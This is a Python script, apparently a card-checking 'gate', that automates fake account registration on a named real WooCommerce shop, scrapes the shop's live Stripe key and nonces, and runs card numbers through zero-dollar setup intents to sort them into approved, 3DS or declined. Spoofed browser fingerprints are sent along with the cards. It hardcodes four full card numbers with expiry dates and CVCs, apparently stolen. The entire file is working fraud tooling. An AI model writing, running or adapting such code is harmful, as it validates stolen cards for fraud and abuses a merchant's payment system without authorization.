# language: Python 3.12+, file: test_custom_gate.py, target: Windows 11
import asyncio
import json
import random
import re
import string
import uuid
import aiohttp

import sys
sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

def rand_str(k=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

async def check_single_card(donor, s, card_raw):
    parts = card_raw.split("|")
    num = parts[0].strip()
    mm = parts[1].strip().zfill(2)
    yy = parts[2].strip()
    yy = "20" + yy[-2:] if len(yy) <= 2 else yy
    cvc = parts[3].strip() if len(parts) > 3 else "000"

    print(f"\n" + "=" * 60)
    print(f"[*] Checking {num[:6]}******{num[-4:]} on {donor}...")

    # 1. Fetch /my-account/
    async with s.get(f"{donor}/my-account/", ssl=False) as r:
        html = await r.text()

    nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']', html)
    if not nonce_m:
        return {"card": card_raw, "status": "ERROR", "detail": "No register nonce"}
    reg_nonce = nonce_m.group(1)

    # 2. Register
    uname = rand_str(10)
    email = f"{uname}@mailnesia.com"
    pwd = f"Pass_{rand_str(8)}!9"
    body = {
        "username": uname,
        "email": email,
        "password": pwd,
        "woocommerce-register-nonce": reg_nonce,
        "_wp_http_referer": "/my-account/",
        "register": "Register"
    }
    post_headers = {
        "Origin": donor,
        "Referer": f"{donor}/my-account/",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    async with s.post(f"{donor}/my-account/", data=body, headers=post_headers, ssl=False) as r:
        await r.text()

    cookies = {c.key: c.value for c in s.cookie_jar}
    logged_in = any("wordpress_logged_in" in k for k in cookies)
    if not logged_in:
        return {"card": card_raw, "status": "ERROR", "detail": "Registration cookie missing"}
    print(f"    [+] Registered: {email}")

    # 3. Fetch /my-account/add-payment-method/
    async with s.get(f"{donor}/my-account/add-payment-method/", ssl=False) as r:
        pm_html = await r.text()

    pk_m = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', pm_html)
    pk = pk_m[0] if pk_m else ""
    upe_m = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
    upe_nonce = upe_m.group(1) if upe_m else ""

    if not pk or not upe_nonce:
        return {"card": card_raw, "status": "ERROR", "detail": "PK or UPE nonce missing"}

    # 4. Tokenize
    fp = {
        "guid": str(uuid.uuid4()),
        "muid": str(uuid.uuid4()),
        "sid": str(uuid.uuid4())
    }
    tok_body = {
        "type": "card",
        "billing_details[name]": "Alex Vance",
        "billing_details[address][postal_code]": "2000",
        "billing_details[address][country]": "AU",
        "card[number]": num,
        "card[cvc]": cvc,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": fp["guid"],
        "muid": fp["muid"],
        "sid": fp["sid"],
        "pasted_fields": "number,cvc",
        "payment_user_agent": "stripe.js/916d815941; stripe-js-v3/916d815941; payment-element; deferred-intent",
        "referrer": donor,
        "time_on_page": str(random.randint(20000, 45000)),
        "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "key": pk,
    }
    tok_headers = {
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json",
    }
    async with s.post("https://api.stripe.com/v1/payment_methods", data=tok_body, headers=tok_headers, ssl=False) as r:
        tok_data = await r.json(content_type=None)

    if "id" not in tok_data:
        err = tok_data.get("error", {}).get("message", str(tok_data))
        return {"card": card_raw, "status": "DECLINED@TOKENIZE", "detail": err}

    pm_id = tok_data["id"]
    brand = tok_data.get("card", {}).get("brand", "card")
    print(f"    [+] Tokenized: {pm_id} ({brand})")

    # 5. Confirm SetupIntent via admin-ajax
    ajax_headers = {
        "Origin": donor,
        "Referer": f"{donor}/my-account/add-payment-method/",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json",
    }
    upe_body = {
        "action": "wc_stripe_create_and_confirm_setup_intent",
        "_ajax_nonce": upe_nonce,
        "wc-stripe-payment-method": pm_id,
        "wc-stripe-payment-type": "card",
    }
    async with s.post(f"{donor}/wp-admin/admin-ajax.php", data=upe_body, headers=ajax_headers, ssl=False) as r:
        conf_resp = await r.json(content_type=None)

    if conf_resp.get("success") is True:
        data = conf_resp.get("data", {})
        st = data.get("status", "succeeded")
        if st == "succeeded":
            return {"card": card_raw, "status": "APPROVED", "detail": f"SetupIntent {data.get('id', '')} Succeeded ($0 auth passed)"}
        elif st == "requires_action":
            return {"card": card_raw, "status": "3DS_REQUIRED", "detail": "Card LIVE, enrolled in 3DS (requires auth challenge)"}
        else:
            return {"card": card_raw, "status": st.upper(), "detail": json.dumps(data)}
    else:
        err_msg = ""
        if isinstance(conf_resp.get("data"), dict):
            err_msg = conf_resp["data"].get("error", {}).get("message", "")
        if not err_msg:
            err_msg = conf_resp.get("message", json.dumps(conf_resp))
        return {"card": card_raw, "status": "DECLINED", "detail": err_msg}

async def main():
    donor = "https://www.blackbeltprotein.com.au"
    
    cards = []
    if len(sys.argv) > 1:
        cards = sys.argv[1:]
    else:
        cards = [
            "5175465382242090|09|2030|018",
            "4420196749812053|02|33|924",
            "5164990150867375|12|28|546",
            "5378721105858595|04|29|528"
        ]

    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    results = []
    for c in cards:
        jar = aiohttp.CookieJar(unsafe=True)
        async with aiohttp.ClientSession(headers=headers, cookie_jar=jar) as s:
            res = await check_single_card(donor, s, c)
            results.append(res)
            print(f">>> VERDICT: [{res['status']}] -> {res['detail']}")
        await asyncio.sleep(4)

    print("\n" + "=" * 80)
    print("[*] FINAL VERDICTS:")
    for r in results:
        print(f"  {r['status']:14} {r['card']:30} {r['detail']}")
    print("=" * 80)

if __name__ == "__main__":
    asyncio.run(main())
